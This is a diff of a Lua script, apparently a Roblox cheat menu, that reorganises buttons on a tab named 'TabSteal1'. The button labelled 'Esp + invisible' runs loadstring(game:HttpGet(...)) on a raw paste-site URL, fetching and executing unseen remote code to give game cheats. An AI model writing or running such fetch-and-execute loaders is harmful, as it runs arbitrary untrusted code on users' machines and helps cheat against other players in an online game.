@@ -1114,21 +1114,13 @@ if allowedMaps[game.PlaceId] then
         TextXAlignment = "Left",
         TextSize = 17,
     })
-end
 
-local Button = TabSteal1:Button({
-    Title = "Button",
-    Desc = "Test Button",
-    Locked = false,
-    Callback = function()
-        print("clicked")
-    end
-})
-local ButtonSteal1 = TabSteal1:Button({
-    Title = "1",
-    Desc = "Esp + invisible",
-    Locked = false,
-    Callback = function()
-        loadstring(game:HttpGet("https://pastefy.app/NU4lqGZe/raw"))()
-    end
-})
+    local ButtonSteal1 = TabSteal1:Button({
+        Title = "1",
+        Desc = "Esp + invisible",
+        Locked = false,
+        Callback = function()
+            loadstring(game:HttpGet("https://pastefy.app/NU4lqGZe/raw"))()
+        end
+    })
+end
